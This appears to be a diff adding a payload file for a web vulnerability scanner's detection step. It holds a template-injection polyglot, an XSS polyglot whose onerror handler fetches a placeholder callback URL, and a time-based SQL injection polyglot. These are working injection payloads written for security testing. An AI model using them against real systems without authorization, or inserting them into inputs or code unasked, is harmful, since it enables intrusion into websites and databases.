@@ -1,0 +1,11 @@
+# Universal polyglot payloads for initial vulnerability detection
+# {{CALLBACK}} replaced with callback URL
+
+# SSTI polyglot - works on 51/51 template engines (Hackmanit)
+<%'${{/#{@}}%>{{
+
+# XSS polyglot with callback - works across HTML contexts
+'--><img/src=x onerror=fetch('{{CALLBACK}}')>
+
+# SQLi time-based polyglot (detection, not OOB)
+SLEEP(1) /*' or SLEEP(1) or '" or SLEEP(1) or "*/
